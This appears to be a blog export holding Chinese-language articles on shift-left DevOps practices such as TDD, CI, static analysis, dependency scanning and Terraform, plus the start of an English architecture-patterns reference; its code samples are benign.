开发阶段：开发人员在编写代码之前或同时编写单元测试。静态分析在编写代码时捕获问题。 集成阶段：自动化测试在每次提交时运行。安全扫描持续进行。 部署阶段：冒烟测试在部署后立即验证关键路径。 运维阶段：监控提供反馈，为未来的开发提供信息。 💡 核心原则左移不是做更多的工作——而是在正确的时间做正确的工作。在代码审查期间发现 bug 需要几分钟。在生产环境中发现它需要数小时或数天。 观察-计划-行动-反思循环 有效的左移实践遵循一个持续改进循环，适用于开发的每个层面： graph LR A([🔍 观察当前状态]) --> B([🎯 计划改进]) B --> C([⚡ 行动实施变更]) C --> D([💭 反思评估结果]) D --> A style A fill:#e1f5ff,stroke:#0288d1,stroke-width:2px style B fill:#fff3e0,stroke:#f57c00,stroke-width:2px style C fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style D fill:#f3e5f5,stroke:#7b1fa2,stroke-width:2px 观察：了解代码、测试和质量指标的当前状态。什么有效？什么失败了？瓶颈在哪里？ 计划：根据观察结果，决定要改进什么。应该添加更多单元测试吗？实施静态分析？提高测试覆盖率？ 行动：实施计划的改进。编写测试、配置工具、更新流程。 反思：评估结果。测试覆盖率提高了吗？bug 是否更早被发现？团队是否移动得更快？ 这个循环在多个层面持续重复： 个人开发者层面：观察代码质量 → 计划重构 → 行动改进 → 反思结果 团队层面：观察测试覆盖率 → 计划测试策略 → 行动实施 → 反思有效性 组织层面：观察质量指标 → 计划流程改进 → 行动变更 → 反思结果 🎬 真实案例一个开发团队观察到集成 bug 经常在周期后期被发现。 他们计划实施在每次提交时运行的集成测试。 他们通过编写测试和配置 CI/CD 流水线来行动。 他们在两个冲刺后反思：早期发现的集成 bug 增加了 60%，后期 bug 修复减少了 40%。 循环继续：他们观察到一些集成测试很慢，计划优化它们，行动改进，并反思结果。 关键左移实践 让我们探讨使左移有效的具体实践。 1. 测试驱动开发（TDD） TDD 颠覆了传统的开发流程：在编写代码之前先编写测试。 TDD 循环： 编写失败的测试：定义代码应该做什么 编写最少的代码：使测试通过 重构：在保持测试通过的同时提高代码质量 重复：转向下一个功能 graph LR A([❌ 编写失败测试]) --> B([✅ 使测试通过]) B --> C([🔧 重构代码]) C --> A style A fill:#ffebee,stroke:#c62828,stroke-width:2px style B fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style C fill:#e3f2fd,stroke:#1976d2,stroke-width:2px 好处： 设计清晰：先编写测试迫使你在实现之前思考接口和行为 完整覆盖：每一行代码都有相应的测试 活文档：测试记录了代码应该如何行为 信心：重构是安全的，因为测试会捕获回归 示例： // 1. 先编写测试 describe('calculateTotal', () => &#123; it('should add tax to subtotal', () => &#123; const result = calculateTotal(100, 0.1); expect(result).toBe(110); &#125;); &#125;); // 2. 编写最少的代码使其通过 function calculateTotal(subtotal, taxRate) &#123; return subtotal + (subtotal * taxRate); &#125; // 3. 如果需要则重构 function calculateTotal(subtotal, taxRate) &#123; if (subtotal &lt; 0 || taxRate &lt; 0) &#123; throw new Error('Values must be positive'); &#125; return subtotal * (1 + taxRate); &#125; 2. 持续集成（CI） CI 自动化了集成代码变更和运行测试的过程。每次提交都会触发构建和测试循环。 CI 如何工作： graph TB A([👨💻 开发者提交代码]) --> B([🔄 CI 服务器检测变更]) B --> C([🏗️ 构建应用程序]) C --> D([🧪 运行测试]) D --> E{所有测试通过？} E -->|是| F([✅ 合并批准]) E -->|否| G([❌ 通知开发者]) G --> A style E fill:#fff3e0,stroke:#f57c00,stroke-width:2px style F fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style G fill:#ffebee,stroke:#c62828,stroke-width:2px 关键原则： 频繁提交：小而频繁的提交比大而不频繁的提交更容易调试。 快速反馈：测试应该快速运行，以便开发人员获得即时反馈。 立即修复损坏的构建：损坏的构建是最高优先级——在修复之前不要提交更多代码。 自动化一切：构建、测试和部署应该不需要手动步骤。 好处： 早期检测：集成问题在提交代码后几分钟内被发现 降低风险：小的变更比大的合并更容易调试 团队信心：每个人都知道代码库的当前状态 更快的开发：自动化测试比手动测试更快 3. 静态代码分析 静态分析在不执行代码的情况下检查代码，捕获安全漏洞、代码异味和样式违规等问题。 静态分析捕获的内容： 安全问题： SQL 注入漏洞 跨站脚本（XSS）风险 硬编码凭证 不安全的加密 代码质量： 未使用的变量 死代码 复杂的函数 重复代码 样式违规： 不一致的格式 命名约定违规 缺少文档 示例工具： SonarQube：综合代码质量平台 ESLint：JavaScript 代码检查 Pylint：Python 代码分析 RuboCop：Ruby 静态分析 Checkmarx：专注于安全的扫描 集成到开发中： # CI/CD 流水线示例 pipeline: - stage: analyze steps: - run: eslint src/ - run: sonar-scanner - run: security-scan - stage: test steps: - run: npm test - stage: build steps: - run: npm run build ⚠️ 避免分析疲劳过多的警告会导致&quot;警报疲劳&quot;，开发人员会忽略所有警告。配置工具以： 首先关注高严重性问题 逐步增加严格性 为团队需求自定义规则 在强制执行新规则之前修复现有问题 4. 安全扫描（左移安全） 安全扫描将安全测试从部署前移至开发时。 安全扫描类型： 静态应用程序安全测试（SAST）：在不执行代码的情况下分析源代码中的漏洞。 依赖扫描：检查第三方库的已知漏洞。 密钥检测：查找意外提交的凭证、API 密钥和令牌。 容器扫描：分析 Docker 镜像的安全问题。 graph TB A([💻 代码提交]) --> B([🔍 SAST 扫描]) B --> C([📦 依赖检查]) C --> D([🔐 密钥检测]) D --> E{发现问题？} E -->|是| F([❌ 阻止合并]) E -->|否| G([✅ 继续流水线]) style E fill:#fff3e0,stroke:#f57c00,stroke-width:2px style F fill:#ffebee,stroke:#c62828,stroke-width:2px style G fill:#e8f5e9,stroke:#388e3c,stroke-width:2px 好处： 早期检测：安全问题在开发期间被发现，而不是在部署前 降低成本：早期修复安全问题比在生产环境中修复更便宜 开发者教育：开发人员通过即时反馈学习安全编码实践 合规性：自动化扫描有助于满足监管要求 示例：依赖扫描 // package.json &#123; \"dependencies\": &#123; \"express\": \"4.16.0\" // 已知漏洞！ &#125; &#125; # CI 流水线运行依赖检查 $ npm audit found 1 high severity vulnerability express: &lt;4.16.2 - Denial of Service Run `npm audit fix` to fix them 5. 基础设施即代码（IaC） IaC 将基础设施配置视为代码，实现基础设施的测试和版本控制。 IaC 的好处： 版本控制：基础设施变更像代码变更一样被跟踪。 测试：基础设施可以在部署前进行测试。 一致性：相同的配置在开发、预发布和生产环境中工作。 自动化：基础设施部署是自动化和可重复的。 示例：Terraform # 定义基础设施 resource \"aws_instance\" \"web\" &#123; ami = \"ami-0c55b159cbfafe1f0\" instance_type = \"t2.micro\" tags = &#123; Name = \"WebServer\" &#125; &#125; # 测试基础设施配置 resource \"aws_security_group\" \"web\" &#123; ingress &#123; from_port = 80 to_port = 80 protocol = \"tcp\" cidr_blocks = [\"0.0.0.0/0\"] &#125; &#125; 测试 IaC： # 验证语法 terraform validate # 检查安全问题 tfsec . # 预览变更 terraform plan # 应用变更 terraform apply 6. 自动化测试金字塔 测试金字塔指导如何在不同层面分配测试工作。 graph TB A[🔺 测试金字塔] B[端到端测试少量、慢速、昂贵] C[集成测试一些、中速] D[单元测试大量、快速、便宜] A --> B B --> C C --> D style B fill:#ffebee,stroke:#c62828,stroke-width:2px style C fill:#fff3e0,stroke:#f57c00,stroke-width:2px style D fill:#e8f5e9,stroke:#388e3c,stroke-width:2px 单元测试（基础）： 测试单个函数或类 快速执行（毫秒） 高覆盖率（70-80% 的测试） 在每次提交时运行 集成测试（中间）： 测试组件之间的交互 中等执行时间（秒） 中等覆盖率（15-25% 的测试） 在每次提交或合并时运行 端到端测试（顶部）： 测试完整的用户工作流 慢速执行（分钟） 有限覆盖率（5-10% 的测试） 在部署前运行 💡 正确的平衡过多的端到端测试：反馈慢、测试脆弱、维护成本高 过少的单元测试：问题发现晚、调试成本高 恰到好处：快速的单元测试捕获大多数问题，集成测试验证交互，端到端测试验证关键路径 实施左移：实用路线图 准备好实施左移实践了吗？这里有一个循序渐进的方法。 第一阶段：基础（第 1-4 周） 建立 CI/CD 流水线： 选择 CI 平台（Jenkins、GitLab CI、GitHub Actions） 配置每次提交时的自动构建 设置基本测试执行 建立构建状态通知 从单元测试开始： 识别关键业务逻辑 为新代码编写单元测试 逐步为现有代码添加测试 最初目标是 60% 的覆盖率 建立代码审查流程： 合并前要求同行审查 创建审查检查清单 关注可读性和可维护性 在团队中分享知识 第二阶段：质量关卡（第 5-8 周） 添加静态分析： 配置代码检查工具 从警告开始，而不是错误 逐步增加严格性 首先修复新代码中的问题 实施安全扫描： 添加依赖漏洞扫描 配置密钥检测 设置自动化警报 创建修复流程 扩展测试覆盖率： 为关键路径添加集成测试 将单元测试覆盖率提高到 70% 创建测试数据管理策略 记录测试标准 第三阶段：高级实践（第 9-12 周） 采用 TDD： 培训团队 TDD 实践 从新功能开始 结对编程以传播知识 衡量对 bug 率的影响 基础设施即代码： 在代码中定义基础设施 版本控制所有配置 测试基础设施变更 自动化部署 性能测试： 将性能测试添加到 CI 建立性能基线 监控性能趋势 对回归发出警报 第四阶段：持续改进（持续进行） 测量和优化： 跟踪关键指标（测试覆盖率、bug 率、构建时间） 识别瓶颈 优化慢速测试 基于数据优化流程 团队文化： 庆祝质量改进 跨团队分享学习 鼓励实验 让质量成为每个人的责任 🎯 成功指标跟踪这些指标以衡量左移的有效性： 缺陷检测率：在生产环境前捕获的 bug 百分比 测试覆盖率：测试覆盖的代码百分比 构建时间：从提交到测试结果的时间 平均修复时间：解决 bug 的平均时间 部署频率：可以安全部署的频率 左移实践应该随着时间的推移改善所有这些指标。 常见挑战和解决方案 实施左移并非没有挑战。以下是如何应对常见障碍。 挑战 1：“我们没有时间编写测试” 现实：你没有时间不编写测试。调试生产问题所需的时间远远超过编写测试。 解决方案： 从关键路径的小规模开始 衡量早期 bug 检测节省的时间 将测试作为&quot;完成&quot;定义的一部分 自动化测试执行以节省时间 挑战 2：“我们的代码库太大了” 现实：大型代码库最能从左移实践中受益。 解决方案： 不要试图一次测试所有内容 专注于新代码和关键路径 逐步扩大覆盖范围 使用代码覆盖率工具识别差距 挑战 3：“测试太慢了” 现实：慢速测试违背了快速反馈的目的。 解决方案： 优化慢速测试 在每次提交时运行单元测试，在合并时运行集成测试 并行化测试执行 使用测试影响分析仅运行受影响的测试 挑战 4：“开发人员抵制变革” 现实：变革是困难的，尤其是当它需要新技能时。 解决方案： 提供培训和支持 从志愿者和早期采用者开始 分享成功故事 使工具易于使用 庆祝改进 挑战 5：“误报太多” 现实：警报疲劳导致开发人员忽略所有警告。 解决方案： 调整工具以减少噪音 仅从高严重性问题开始 逐步增加严格性 为你的上下文自定义规则 及时修复问题以保持可信度 文化转变 左移既关乎文化，也关乎工具和实践。它需要团队对质量的思考方式发生根本性变化。 从&quot;QA 的工作&quot;到&quot;每个人的工作&quot;： 质量不再是单独 QA 团队的责任。每个开发人员都对其代码的质量负责。 从&quot;测试阶段&quot;到&quot;持续测试&quot;： 测试不是开发后发生的阶段。它是集成到每个步骤的持续活动。 从&quot;发现 bug&quot;到&quot;预防 bug&quot;： 目标不是高效地发现 bug——而是从一开始就防止它们被编写出来。 从&quot;责备&quot;到&quot;学习&quot;： 当 bug 发生时，重点是学习和改进流程，而不是找人责备。 ✨ 成功左移文化的标志 开发人员无需被要求就编写测试 代码审查关注质量，而不仅仅是功能 团队庆祝早期发现 bug 损坏的构建立即修复 质量指标随时间改善 部署信心增加 生产事故减少 结论：质量作为一等公民 左移代表了我们构建软件方式的根本转变。通过在开发生命周期中更早地引入质量实践，我们在修复成本最低时捕获问题，降低风险，并加速交付。 观察-计划-行动-反思循环为每个层面的持续改进提供了框架——从个人开发者到整个组织。每次迭代都使系统变得更好，创造了质量改进的良性循环。 但左移不仅仅是工具和流程。它关乎文化。它关乎从第一天起就让质量成为每个人的责任。它关乎构建为质量而设计的系统，而不仅仅是为质量而测试的系统。 拥抱左移的组织不仅交付得更快——他们交付得更好。他们花更少的时间扑灭生产问题，花更多的时间构建新功能。他们对部署有信心，因为质量是内置的，而不是后加的。 问题不是是否要左移。而是你能多快开始。 💭 最后的思考&quot;质量不是一种行为，而是一种习惯。&quot; —— 亚里士多德 左移通过将质量整合到开发的每个步骤中，使质量成为一种习惯。结果不仅仅是更好的软件——而是更好的团队、更好的流程和更好的结果。 commentBox('5765834504929280-proj')","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"DevOps","slug":"DevOps","permalink":"https://neo01.com/tags/DevOps/"},{"name":"Testing","slug":"Testing","permalink":"https://neo01.com/tags/Testing/"},{"name":"Quality","slug":"Quality","permalink":"https://neo01.com/tags/Quality/"}],"lang":"zh-CN"},{"title":"DevOps 中的左移：在流水線中更早地引入品質","slug":"2020/06/Shift-Left-DevOps-Moving-Quality-Earlier-zh-TW","date":"un55fin55","updated":"un55fin55","comments":true,"path":"/zh-TW/2020/06/Shift-Left-DevOps-Moving-Quality-Earlier/","permalink":"https://neo01.com/zh-TW/2020/06/Shift-Left-DevOps-Moving-Quality-Earlier/","excerpt":"探索左移實踐如何透過儘早發現問題來改變軟體開發。了解觀察-計畫-行動-反思循環，讓品質從第一天起就成為每個人的責任。","text":"軟體開發有一個代價高昂的問題：發現 bug 的時間越晚，修復成本就越高。在程式碼審查期間發現的 bug 只需幾分鐘就能修復。而在生產環境中發現的同一個 bug 則需要數小時的除錯、緊急部署，並可能導致收入損失或聲譽受損。 這一現實推動了現代 DevOps 中最重要的運動之一：左移。 「左移」一詞指的是在軟體開發生命週期中更早地引入品質實踐——從字面上看，就是在時間線圖上將它們向左移動。我們不是在開發完成後進行測試，而是在開發過程中進行測試。我們不是在部署前才考慮安全性，而是在設計階段就考慮它。 這不僅僅是更早地進行測試。它從根本上重新思考我們何時以及如何確保品質，以及誰對此負責。 傳統方法：品質作為關卡 幾十年來，軟體開發遵循線性路徑： graph LR A([📝 需求]) --> B([💻 開發]) B --> C([🧪 測試]) C --> D([🚀 部署]) D --> E([⚙️ 維運]) style C fill:#fff3e0,stroke:#f57c00,stroke-width:2px style E fill:#ffebee,stroke:#c62828,stroke-width:2px 開發人員編寫程式碼。完成後，他們將程式碼「扔過牆」給 QA 團隊進行測試。如果發現 bug，程式碼會返回給開發人員。這個循環不斷重複，直到通過品質關卡。 這種方法的問題： 回饋緩慢：開發人員可能需要數天或數週才能看到測試結果。到那時，他們已經忘記了上下文並轉向其他專案。 修復成本高：在週期後期更改程式碼通常需要重新編寫文件、測試和相關功能。 責任孤立：開發人員專注於功能，QA 專注於品質。雙方都沒有掌握完整的全局。 覆蓋範圍有限：測試發生在與生產條件不匹配的人工環境中。 瓶頸：隨著開發團隊的增長速度快於測試能力，QA 團隊成為瓶頸。 左移革命 左移改變了根本問題，從「我們如何測試這個？」變為「我們如何從一開始就建構品質？」 graph LR A([📝 需求+ 測試計畫]) --> B([💻 開發+ 單元測試]) B --> C([🧪 整合測試+ 安全掃描]) C --> D([🚀 部署+ 冒煙測試]) D --> E([⚙️ 維運+ 監控]) style A fill:#e3f2fd,stroke:#1976d2,stroke-width:2px style B fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style C fill:#fff3e0,stroke:#f57c00,stroke-width:2px 品質實踐被整合到每個階段： 需求階段：測試場景與功能一起定義。驗收標準成為自動化測試。 開發階段：開發人員在編寫程式碼之前或同時編寫單元測試。靜態分析在編寫程式碼時捕獲問題。 整合階段：自動化測試在每次提交時執行。安全掃描持續進行。 部署階段：冒煙測試在部署後立即驗證關鍵路徑。 維運階段：監控提供回饋，為未來的開發提供資訊。 💡 核心原則左移不是做更多的工作——而是在正確的時間做正確的工作。在程式碼審查期間發現 bug 需要幾分鐘。在生產環境中發現它需要數小時或數天。 觀察-計畫-行動-反思循環 有效的左移實踐遵循一個持續改進循環，適用於開發的每個層面： graph LR A([🔍 觀察當前狀態]) --> B([🎯 計畫改進]) B --> C([⚡ 行動實施變更]) C --> D([💭 反思評估結果]) D --> A style A fill:#e1f5ff,stroke:#0288d1,stroke-width:2px style B fill:#fff3e0,stroke:#f57c00,stroke-width:2px style C fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style D fill:#f3e5f5,stroke:#7b1fa2,stroke-width:2px 觀察：了解程式碼、測試和品質指標的當前狀態。什麼有效？什麼失敗了？瓶頸在哪裡？ 計畫：根據觀察結果，決定要改進什麼。應該新增更多單元測試嗎？實施靜態分析？提高測試覆蓋率？ 行動：實施計畫的改進。編寫測試、設定工具、更新流程。 反思：評估結果。測試覆蓋率提高了嗎？bug 是否更早被發現？團隊是否移動得更快？ 這個循環在多個層面持續重複： 個人開發者層面：觀察程式碼品質 → 計畫重構 → 行動改進 → 反思結果 團隊層面：觀察測試覆蓋率 → 計畫測試策略 → 行動實施 → 反思有效性 組織層面：觀察品質指標 → 計畫流程改進 → 行動變更 → 反思結果 🎬 真實案例一個開發團隊觀察到整合 bug 經常在週期後期被發現。 他們計畫實施在每次提交時執行的整合測試。 他們透過編寫測試和設定 CI/CD 流水線來行動。 他們在兩個衝刺後反思：早期發現的整合 bug 增加了 60%，後期 bug 修復減少了 40%。 循環繼續：他們觀察到一些整合測試很慢，計畫最佳化它們，行動改進，並反思結果。 關鍵左移實踐 讓我們探討使左移有效的具體實踐。 1. 測試驅動開發（TDD） TDD 顛覆了傳統的開發流程：在編寫程式碼之前先編寫測試。 TDD 循環： 編寫失敗的測試：定義程式碼應該做什麼 編寫最少的程式碼：使測試通過 重構：在保持測試通過的同時提高程式碼品質 重複：轉向下一個功能 graph LR A([❌ 編寫失敗測試]) --> B([✅ 使測試通過]) B --> C([🔧 重構程式碼]) C --> A style A fill:#ffebee,stroke:#c62828,stroke-width:2px style B fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style C fill:#e3f2fd,stroke:#1976d2,stroke-width:2px 好處： 設計清晰：先編寫測試迫使你在實作之前思考介面和行為 完整覆蓋：每一行程式碼都有相應的測試 活文件：測試記錄了程式碼應該如何行為 信心：重構是安全的，因為測試會捕獲回歸 範例： // 1. 先編寫測試 describe('calculateTotal', () => &#123; it('should add tax to subtotal', () => &#123; const result = calculateTotal(100, 0.1); expect(result).toBe(110); &#125;); &#125;); // 2. 編寫最少的程式碼使其通過 function calculateTotal(subtotal, taxRate) &#123; return subtotal + (subtotal * taxRate); &#125; // 3. 如果需要則重構 function calculateTotal(subtotal, taxRate) &#123; if (subtotal &lt; 0 || taxRate &lt; 0) &#123; throw new Error('Values must be positive'); &#125; return subtotal * (1 + taxRate); &#125; 2. 持續整合（CI） CI 自動化了整合程式碼變更和執行測試的過程。每次提交都會觸發建置和測試循環。 CI 如何運作： graph TB A([👨💻 開發者提交程式碼]) --> B([🔄 CI 伺服器偵測變更]) B --> C([🏗️ 建置應用程式]) C --> D([🧪 執行測試]) D --> E{所有測試通過？} E -->|是| F([✅ 合併批准]) E -->|否| G([❌ 通知開發者]) G --> A style E fill:#fff3e0,stroke:#f57c00,stroke-width:2px style F fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style G fill:#ffebee,stroke:#c62828,stroke-width:2px 關鍵原則： 頻繁提交：小而頻繁的提交比大而不頻繁的提交更容易除錯。 快速回饋：測試應該快速執行，以便開發人員獲得即時回饋。 立即修復損壞的建置：損壞的建置是最高優先順序——在修復之前不要提交更多程式碼。 自動化一切：建置、測試和部署應該不需要手動步驟。 好處： 早期偵測：整合問題在提交程式碼後幾分鐘內被發現 降低風險：小的變更比大的合併更容易除錯 團隊信心：每個人都知道程式碼庫的當前狀態 更快的開發：自動化測試比手動測試更快 3. 靜態程式碼分析 靜態分析在不執行程式碼的情況下檢查程式碼，捕獲安全漏洞、程式碼異味和樣式違規等問題。 靜態分析捕獲的內容： 安全問題： SQL 注入漏洞 跨站腳本（XSS）風險 硬編碼憑證 不安全的加密 程式碼品質： 未使用的變數 死程式碼 複雜的函式 重複程式碼 樣式違規： 不一致的格式 命名慣例違規 缺少文件 範例工具： SonarQube：綜合程式碼品質平台 ESLint：JavaScript 程式碼檢查 Pylint：Python 程式碼分析 RuboCop：Ruby 靜態分析 Checkmarx：專注於安全的掃描 整合到開發中： # CI/CD 流水線範例 pipeline: - stage: analyze steps: - run: eslint src/ - run: sonar-scanner - run: security-scan - stage: test steps: - run: npm test - stage: build steps: - run: npm run build ⚠️ 避免分析疲勞過多的警告會導致「警報疲勞」，開發人員會忽略所有警告。設定工具以： 首先關注高嚴重性問題 逐步增加嚴格性 為團隊需求自訂規則 在強制執行新規則之前修復現有問題 4. 安全掃描（左移安全） 安全掃描將安全測試從部署前移至開發時。 安全掃描類型： 靜態應用程式安全測試（SAST）：在不執行程式碼的情況下分析原始碼中的漏洞。 相依性掃描：檢查第三方函式庫的已知漏洞。 密鑰偵測：尋找意外提交的憑證、API 金鑰和權杖。 容器掃描：分析 Docker 映像的安全問題。 graph TB A([💻 程式碼提交]) --> B([🔍 SAST 掃描]) B --> C([📦 相依性檢查]) C --> D([🔐 密鑰偵測]) D --> E{發現問題？} E -->|是| F([❌ 阻止合併]) E -->|否| G([✅ 繼續流水線]) style E fill:#fff3e0,stroke:#f57c00,stroke-width:2px style F fill:#ffebee,stroke:#c62828,stroke-width:2px style G fill:#e8f5e9,stroke:#388e3c,stroke-width:2px 好處： 早期偵測：安全問題在開發期間被發現，而不是在部署前 降低成本：早期修復安全問題比在生產環境中修復更便宜 開發者教育：開發人員透過即時回饋學習安全編碼實踐 合規性：自動化掃描有助於滿足監管要求 範例：相依性掃描 // package.json &#123; \"dependencies\": &#123; \"express\": \"4.16.0\" // 已知漏洞！ &#125; &#125; # CI 流水線執行相依性檢查 $ npm audit found 1 high severity vulnerability express: &lt;4.16.2 - Denial of Service Run `npm audit fix` to fix them 5. 基礎設施即程式碼（IaC） IaC 將基礎設施設定視為程式碼，實現基礎設施的測試和版本控制。 IaC 的好處： 版本控制：基礎設施變更像程式碼變更一樣被追蹤。 測試：基礎設施可以在部署前進行測試。 一致性：相同的設定在開發、預發布和生產環境中運作。 自動化：基礎設施部署是自動化和可重複的。 範例：Terraform # 定義基礎設施 resource \"aws_instance\" \"web\" &#123; ami = \"ami-0c55b159cbfafe1f0\" instance_type = \"t2.micro\" tags = &#123; Name = \"WebServer\" &#125; &#125; # 測試基礎設施設定 resource \"aws_security_group\" \"web\" &#123; ingress &#123; from_port = 80 to_port = 80 protocol = \"tcp\" cidr_blocks = [\"0.0.0.0/0\"] &#125; &#125; 測試 IaC： # 驗證語法 terraform validate # 檢查安全問題 tfsec . # 預覽變更 terraform plan # 套用變更 terraform apply 6. 自動化測試金字塔 測試金字塔指導如何在不同層面分配測試工作。 graph TB A[🔺 測試金字塔] B[端對端測試少量、慢速、昂貴] C[整合測試一些、中速] D[單元測試大量、快速、便宜] A --> B B --> C C --> D style B fill:#ffebee,stroke:#c62828,stroke-width:2px style C fill:#fff3e0,stroke:#f57c00,stroke-width:2px style D fill:#e8f5e9,stroke:#388e3c,stroke-width:2px 單元測試（基礎）： 測試單個函式或類別 快速執行（毫秒） 高覆蓋率（70-80% 的測試） 在每次提交時執行 整合測試（中間）： 測試元件之間的互動 中等執行時間（秒） 中等覆蓋率（15-25% 的測試） 在每次提交或合併時執行 端對端測試（頂部）： 測試完整的使用者工作流程 慢速執行（分鐘） 有限覆蓋率（5-10% 的測試） 在部署前執行 💡 正確的平衡過多的端對端測試：回饋慢、測試脆弱、維護成本高 過少的單元測試：問題發現晚、除錯成本高 恰到好處：快速的單元測試捕獲大多數問題，整合測試驗證互動，端對端測試驗證關鍵路徑 實施左移：實用路線圖 準備好實施左移實踐了嗎？這裡有一個循序漸進的方法。 第一階段：基礎（第 1-4 週） 建立 CI/CD 流水線： 選擇 CI 平台（Jenkins、GitLab CI、GitHub Actions） 設定每次提交時的自動建置 設定基本測試執行 建立建置狀態通知 從單元測試開始： 識別關鍵業務邏輯 為新程式碼編寫單元測試 逐步為現有程式碼新增測試 最初目標是 60% 的覆蓋率 建立程式碼審查流程： 合併前要求同儕審查 建立審查檢查清單 關注可讀性和可維護性 在團隊中分享知識 第二階段：品質關卡（第 5-8 週） 新增靜態分析： 設定程式碼檢查工具 從警告開始，而不是錯誤 逐步增加嚴格性 首先修復新程式碼中的問題 實施安全掃描： 新增相依性漏洞掃描 設定密鑰偵測 設定自動化警報 建立修復流程 擴展測試覆蓋率： 為關鍵路徑新增整合測試 將單元測試覆蓋率提高到 70% 建立測試資料管理策略 記錄測試標準 第三階段：進階實踐（第 9-12 週） 採用 TDD： 培訓團隊 TDD 實踐 從新功能開始 結對程式設計以傳播知識 衡量對 bug 率的影響 基礎設施即程式碼： 在程式碼中定義基礎設施 版本控制所有設定 測試基礎設施變更 自動化部署 效能測試： 將效能測試新增到 CI 建立效能基準 監控效能趨勢 對回歸發出警報 第四階段：持續改進（持續進行） 測量和最佳化： 追蹤關鍵指標（測試覆蓋率、bug 率、建置時間） 識別瓶頸 最佳化慢速測試 基於資料最佳化流程 團隊文化： 慶祝品質改進 跨團隊分享學習 鼓勵實驗 讓品質成為每個人的責任 🎯 成功指標追蹤這些指標以衡量左移的有效性： 缺陷偵測率：在生產環境前捕獲的 bug 百分比 測試覆蓋率：測試覆蓋的程式碼百分比 建置時間：從提交到測試結果的時間 平均修復時間：解決 bug 的平均時間 部署頻率：可以安全部署的頻率 左移實踐應該隨著時間的推移改善所有這些指標。 常見挑戰和解決方案 實施左移並非沒有挑戰。以下是如何應對常見障礙。 挑戰 1：「我們沒有時間編寫測試」 現實：你沒有時間不編寫測試。除錯生產問題所需的時間遠遠超過編寫測試。 解決方案： 從關鍵路徑的小規模開始 衡量早期 bug 偵測節省的時間 將測試作為「完成」定義的一部分 自動化測試執行以節省時間 挑戰 2：「我們的程式碼庫太大了」 現實：大型程式碼庫最能從左移實踐中受益。 解決方案： 不要試圖一次測試所有內容 專注於新程式碼和關鍵路徑 逐步擴大覆蓋範圍 使用程式碼覆蓋率工具識別差距 挑戰 3：「測試太慢了」 現實：慢速測試違背了快速回饋的目的。 解決方案： 最佳化慢速測試 在每次提交時執行單元測試，在合併時執行整合測試 平行化測試執行 使用測試影響分析僅執行受影響的測試 挑戰 4：「開發人員抵制變革」 現實：變革是困難的，尤其是當它需要新技能時。 解決方案： 提供培訓和支援 從志願者和早期採用者開始 分享成功故事 使工具易於使用 慶祝改進 挑戰 5：「誤報太多」 現實：警報疲勞導致開發人員忽略所有警告。 解決方案： 調整工具以減少雜訊 僅從高嚴重性問題開始 逐步增加嚴格性 為你的情境自訂規則 及時修復問題以保持可信度 文化轉變 左移既關乎文化，也關乎工具和實踐。它需要團隊對品質的思考方式發生根本性變化。 從「QA 的工作」到「每個人的工作」： 品質不再是單獨 QA 團隊的責任。每個開發人員都對其程式碼的品質負責。 從「測試階段」到「持續測試」： 測試不是開發後發生的階段。它是整合到每個步驟的持續活動。 從「發現 bug」到「預防 bug」： 目標不是高效地發現 bug——而是從一開始就防止它們被編寫出來。 從「責備」到「學習」： 當 bug 發生時，重點是學習和改進流程，而不是找人責備。 ✨ 成功左移文化的標誌 開發人員無需被要求就編寫測試 程式碼審查關注品質，而不僅僅是功能 團隊慶祝早期發現 bug 損壞的建置立即修復 品質指標隨時間改善 部署信心增加 生產事故減少 結論：品質作為一等公民 左移代表了我們建構軟體方式的根本轉變。透過在開發生命週期中更早地引入品質實踐，我們在修復成本最低時捕獲問題，降低風險，並加速交付。 觀察-計畫-行動-反思循環為每個層面的持續改進提供了框架——從個人開發者到整個組織。每次迭代都使系統變得更好，創造了品質改進的良性循環。 但左移不僅僅是工具和流程。它關乎文化。它關乎從第一天起就讓品質成為每個人的責任。它關乎建構為品質而設計的系統，而不僅僅是為品質而測試的系統。 擁抱左移的組織不僅交付得更快——他們交付得更好。他們花更少的時間撲滅生產問題，花更多的時間建構新功能。他們對部署有信心，因為品質是內建的，而不是後加的。 問題不是是否要左移。而是你能多快開始。 💭 最後的思考「品質不是一種行為，而是一種習慣。」—— 亞里斯多德 左移透過將品質整合到開發的每個步驟中，使品質成為一種習慣。結果不僅僅是更好的軟體——而是更好的團隊、更好的流程和更好的結果。 commentBox('5765834504929280-proj')","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"DevOps","slug":"DevOps","permalink":"https://neo01.com/tags/DevOps/"},{"name":"Testing","slug":"Testing","permalink":"https://neo01.com/tags/Testing/"},{"name":"Quality","slug":"Quality","permalink":"https://neo01.com/tags/Quality/"}],"lang":"zh-TW"},{"title":"Architecture Patterns Quick Reference","slug":"2020/05/Architecture-Patterns-Quick-Reference","date":"un33fin33","updated":"un55fin55","comments":true,"path":"2020/05/Architecture-Patterns-Quick-Reference/","permalink":"https://neo01.com/2020/05/Architecture-Patterns-Quick-Reference/","excerpt":"A comprehensive quick reference guide to cloud architecture patterns. Find the right pattern for your challenge with decision trees, comparison tables, and practical selection criteria.","text":"Building resilient, scalable distributed systems requires choosing the right architectural patterns for your specific challenges. This guide provides a quick reference to help you select the most appropriate pattern based on your problem domain, with links to detailed explanations of each pattern. Pattern Selection Quick Reference Use this table to quickly identify which pattern addresses your specific challenge: Your Challenge Recommended Pattern When to Use Service calls timing out Asynchronous Request-Reply Operations take longer than HTTP timeout limits Service keeps failing Circuit Breaker Prevent cascading failures from unavailable services Temporary network glitches Retry Handle transient failures that resolve quickly One service affecting others Bulkhead Isolate resources to contain failures API throttling errors Rate Limiting Control request rate to throttled services Legacy system integration Anti-Corruption Layer Protect clean architecture from legacy systems Slow query performance Materialized View Pre-compute complex queries for faster reads Large message payloads Claim Check Reduce message size by storing data externally Migrating legacy systems Strangler Fig Gradually replace legacy with modern systems Cross-cutting concerns Sidecar Add functionality without modifying applications Database scalability Sharding Distribute data across multiple databases Multiple API calls Gateway Aggregation Combine multiple backend calls into one Event distribution Publisher-Subscriber Decouple event producers from consumers Service health monitoring Health Endpoint Monitoring Proactively detect service failures 